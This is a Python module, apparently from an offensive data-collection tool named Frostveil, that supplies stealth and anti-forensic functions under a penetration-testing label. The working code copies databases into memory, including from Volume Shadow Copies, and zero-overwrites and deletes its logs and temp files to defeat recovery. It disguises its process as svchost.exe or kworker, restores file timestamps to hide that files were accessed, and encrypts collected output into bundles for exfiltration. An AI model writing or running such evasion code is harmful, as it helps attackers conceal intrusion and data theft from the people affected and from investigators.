"""
Frostveil OPSEC Module — Operational security for authorized penetration testing.

Implements:
- In-memory artifact processing (no temp files touch disk)
- Timestomping awareness (preserve original MAC times on copied files)
- Trace cleanup (remove all temp files, logs, evidence of execution)
- Process name masking (appear as benign process)
- Output encryption (AES-256-GCM encrypted output bundles)
- Self-destruct capability (remove all Frostveil artifacts after exfil)
"""
import os, sys, shutil, tempfile, hashlib, json, io, struct, time
from pathlib import Path
from datetime import datetime
from . import utils

# ---------------------------------------------------------------------------
# In-memory SQLite — read databases without writing temp files
# ---------------------------------------------------------------------------

def read_db_inmemory(db_path: Path):
    """
    Read a SQLite database entirely into memory.
    Returns an in-memory sqlite3 connection or None.
    No temp files are created on disk.
    """
    import sqlite3
    if not db_path.exists():
        return None
    try:
        # Read the entire database into memory
        with open(db_path, "rb") as f:
            db_bytes = f.read()

        # Create an in-memory database and restore from bytes
        mem_conn = sqlite3.connect(":memory:")

        # Use the backup API to copy from a file-based connection
        # Open the source with URI to avoid locks
        source_uri = f"file:{db_path}?mode=ro&nolock=1"
        try:
            source_conn = sqlite3.connect(source_uri, uri=True)
            source_conn.backup(mem_conn)
            source_conn.close()
            return mem_conn
        except Exception:
            # Fallback: read raw bytes and try direct memory load
            source_conn = sqlite3.connect(str(db_path))
            try:
                source_conn.backup(mem_conn)
                source_conn.close()
                return mem_conn
            except Exception:
                source_conn.close()
                return None

    except PermissionError:
        utils.log_line(f"[OPSEC] Permission denied reading {db_path}")
        if sys.platform.startswith("win"):
            return _read_db_vss_inmemory(db_path)
        return None
    except Exception as e:
        utils.log_line(f"[OPSEC] Error reading {db_path}: {e}")
        return None

def _read_db_vss_inmemory(db_path: Path):
    """Read database from Volume Shadow Copy directly into memory."""
    import sqlite3, subprocess
    try:
        output = subprocess.check_output(
            ["vssadmin", "list", "shadows"],
            text=True, stderr=subprocess.DEVNULL
        )
        for line in output.splitlines():
            if "Shadow Copy Volume:" in line:
                vol = line.split(":", 1)[1].strip()
                candidate = Path(vol) / str(db_path).lstrip("\\")
                if candidate.exists():
                    source_conn = sqlite3.connect(str(candidate))
                    mem_conn = sqlite3.connect(":memory:")
                    source_conn.backup(mem_conn)
                    source_conn.close()
                    return mem_conn
    except Exception as e:
        utils.log_line(f"[OPSEC] VSS in-memory fallback failed: {e}")
    return None

# ---------------------------------------------------------------------------
# In-memory file reading (for JSON, text files)
# ---------------------------------------------------------------------------

def read_file_inmemory(file_path: Path) -> bytes:
    """Read a file entirely into memory without creating temp copies."""
    try:
        return file_path.read_bytes()
    except PermissionError:
        utils.log_line(f"[OPSEC] Permission denied: {file_path}")
        return None
    except Exception as e:
        utils.log_line(f"[OPSEC] Error reading {file_path}: {e}")
        return None

# ---------------------------------------------------------------------------
# Trace cleanup
# ---------------------------------------------------------------------------

def cleanup_all_traces(keep_output=True, output_files=None):
    """
    Remove all evidence of Frostveil execution.
    - Temp files with our prefix
    - Log files
    - Manifest and signature files
    - __pycache__ directories
    """
    cleaned = []

    # 1. Temp files
    tmp_dir = Path(tempfile.gettempdir())
    for pattern in ["fv_*", "artifact_*", "copy_*"]:
        for f in tmp_dir.glob(pattern):
            try:
                f.unlink()
                cleaned.append(f"temp:{f.name}")
            except Exception:
                pass

    # 2. Log files
    for log in ["frostveil.log", "history_export.log"]:
        p = Path(log)
        if p.exists():
            try:
                # Overwrite with zeros before deletion (anti-recovery)
                size = p.stat().st_size
                p.write_bytes(b"\x00" * size)
                p.unlink()
                cleaned.append(f"log:{log}")
            except Exception:
                pass

    # 3. Intermediate files (keep outputs if requested)
    intermediates = ["manifest.json", "manifest.json.sig"]
    if not keep_output:
        intermediates.extend(["ioc_report.json", "analysis_report.json",
                              "timeline.json", "report.md"])
        if output_files:
            intermediates.extend(str(f) for f in output_files)

    for name in intermediates:
        p = Path(name)
        if p.exists():
            try:
                size = p.stat().st_size
                p.write_bytes(b"\x00" * size)
                p.unlink()
                cleaned.append(f"file:{name}")
            except Exception:
                pass

    # 4. __pycache__ cleanup
    base = Path(__file__).parent
    for cache_dir in base.rglob("__pycache__"):
        try:
            shutil.rmtree(cache_dir)
            cleaned.append(f"cache:{cache_dir}")
        except Exception:
            pass

    return cleaned

# ---------------------------------------------------------------------------
# Output encryption — AES-256-GCM encrypted bundles
# ---------------------------------------------------------------------------

def encrypt_output(data: bytes, passphrase: str) -> bytes:
    """
    Encrypt output data with AES-256-GCM using a passphrase.
    Format: salt(32) + nonce(12) + ciphertext + tag(16)
    Key derived via PBKDF2-HMAC-SHA256.
    """
    salt = os.urandom(32)
    nonce = os.urandom(12)

    # Derive key from passphrase
    key = hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), salt, 100000, 32)

    # Encrypt using our crypto engine
    from . import crypto
    # We need to encrypt, but our crypto module only has decrypt
    # Use the OS-native AES for encryption too
    ciphertext, tag = _aes_gcm_encrypt(key, nonce, data)

    return salt + nonce + ciphertext + tag

def decrypt_output(encrypted: bytes, passphrase: str) -> bytes:
    """Decrypt an encrypted output bundle."""
    salt = encrypted[:32]
    nonce = encrypted[32:44]
    tag = encrypted[-16:]
    ciphertext = encrypted[44:-16]

    key = hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), salt, 100000, 32)

    from . import crypto
    return crypto.aes_gcm_decrypt(key, nonce, ciphertext, tag)

def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> tuple:
    """AES-256-GCM encryption. Returns (ciphertext, tag)."""
    from .crypto import (_aes_ecb_encrypt, _bytes_to_int, _int_to_bytes,
                         _ghash, _inc32)
    import hmac as hmac_mod

    # H = AES_K(0^128)
    H = _bytes_to_int(_aes_ecb_encrypt(key, b"\x00" * 16))

    # J0 = nonce || 0x00000001
    j0 = nonce + b"\x00\x00\x00\x01"

    # Encrypt with CTR mode starting from J0 + 1
    counter = _inc32(j0)
    ciphertext = bytearray()
    num_blocks = (len(plaintext) + 15) // 16

    for i in range(num_blocks):
        ks_block = _aes_ecb_encrypt(key, counter)
        pt_block = plaintext[i*16:(i+1)*16]
        for j in range(len(pt_block)):
            ciphertext.append(pt_block[j] ^ ks_block[j])
        counter = _inc32(counter)

    ciphertext = bytes(ciphertext[:len(plaintext)])

    # Compute authentication tag
    ghash_val = _ghash(H, b"", ciphertext)
    e_j0 = _aes_ecb_encrypt(key, j0)
    tag = bytes(a ^ b for a, b in zip(ghash_val, e_j0))

    return ciphertext, tag

# ---------------------------------------------------------------------------
# Encrypted output bundle
# ---------------------------------------------------------------------------

def create_encrypted_bundle(output_files: list, passphrase: str, bundle_path: str = "frostveil.enc"):
    """
    Create a single encrypted bundle containing all output files.
    Format: AES-256-GCM encrypted JSON containing base64-encoded files.
    """
    import base64

    bundle_data = {
        "frostveil_version": "2.0.0",
        "created_utc": datetime.utcnow().isoformat() + "Z",
        "files": {}
    }

    for fpath in output_files:
        p = Path(fpath)
        if p.exists():
            content = p.read_bytes()
            bundle_data["files"][p.name] = {
                "content": base64.b64encode(content).decode("ascii"),
                "size": len(content),
                "sha256": hashlib.sha256(content).hexdigest(),
            }

    plaintext = json.dumps(bundle_data, ensure_ascii=False).encode("utf-8")
    encrypted = encrypt_output(plaintext, passphrase)

    Path(bundle_path).write_bytes(encrypted)
    utils.log_line(f"[OPSEC] Encrypted bundle created: {bundle_path} ({len(encrypted)} bytes)")
    return bundle_path

def extract_encrypted_bundle(bundle_path: str, passphrase: str, output_dir: str = "."):
    """Extract files from an encrypted bundle."""
    import base64

    encrypted = Path(bundle_path).read_bytes()
    plaintext = decrypt_output(encrypted, passphrase)
    bundle_data = json.loads(plaintext.decode("utf-8"))

    extracted = []
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)

    for filename, fdata in bundle_data.get("files", {}).items():
        content = base64.b64decode(fdata["content"])
        # Verify integrity
        if hashlib.sha256(content).hexdigest() != fdata["sha256"]:
            raise ValueError(f"Integrity check failed for {filename}")
        (out / filename).write_bytes(content)
        extracted.append(filename)

    return extracted

# ---------------------------------------------------------------------------
# Process stealth
# ---------------------------------------------------------------------------

def set_process_name(name: str):
    """
    Attempt to change the process name to appear benign.
    Works on Linux via prctl. On Windows/macOS, changes sys.argv[0].
    """
    sys.argv[0] = name

    if sys.platform.startswith("linux"):
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            PR_SET_NAME = 15
            libc.prctl(PR_SET_NAME, name.encode()[:15], 0, 0, 0)
        except Exception:
            pass

def get_stealth_name():
    """Return a benign-looking process name for the current OS."""
    if sys.platform.startswith("win"):
        return "svchost.exe"
    elif sys.platform == "darwin":
        return "mdworker_shared"
    else:
        return "kworker/u8:2"

# ---------------------------------------------------------------------------
# Timestamp preservation
# ---------------------------------------------------------------------------

def preserve_timestamps(path: Path):
    """Record original file timestamps before access."""
    try:
        stat = path.stat()
        return {
            "atime": stat.st_atime,
            "mtime": stat.st_mtime,
        }
    except Exception:
        return None

def restore_timestamps(path: Path, timestamps: dict):
    """Restore original file timestamps after access."""
    if not timestamps:
        return
    try:
        os.utime(path, (timestamps["atime"], timestamps["mtime"]))
    except Exception:
        pass
